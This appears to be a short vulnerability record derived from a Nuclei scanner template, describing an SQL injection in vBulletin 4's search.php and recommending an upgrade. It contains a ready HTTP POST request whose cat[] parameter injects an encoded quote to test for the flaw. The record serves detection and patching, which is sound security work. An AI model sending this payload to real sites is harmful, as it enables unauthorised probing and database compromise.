# Vulnerability: vBulletin `Search.php` - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`vbulletin-search-sqli.yaml`)

## Description
vBulletin 4 is vulnerable to an SQL injection vulnerability, which may allow an attacker can execute malicious SQL statements that control a web application's database server.

## Secure Mitigation
Upgrade to the latest version of vBulletin.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /search.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

contenttypeid=7&do=process&humanverify=1&cat[]=-1%27
```

